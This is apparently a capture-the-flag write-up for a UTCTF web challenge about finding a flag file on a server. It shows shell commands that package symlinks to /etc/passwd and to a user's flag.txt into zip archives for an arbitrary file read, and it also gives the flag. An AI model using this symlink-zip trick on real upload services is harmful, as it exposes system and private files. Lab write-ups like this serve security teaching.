Hey, my digital cat managed to get into my server and I can't get him out.
The only thing running on the server is a website a colleague of mine made.
Can you find a way to use the website to check if my cat's okay? He'll likely be in the user's home directory.
You'll know he's fine if you find a "flag.txt" file.
By helix (@helix_shift on discord)

http://betta.utctf.live:5422

ln -s /etc/passwd f
zip --symlinks etcpasswd.zip f

ln -s /home/copenhagen/flag.txt flag
zip --symlinks flag.zip flag


https://systemweakness.com/arbitrary-file-read-via-symbolic-links-f794e6fd2c2b

utflag{No_Observable_Cats_Were_Harmed}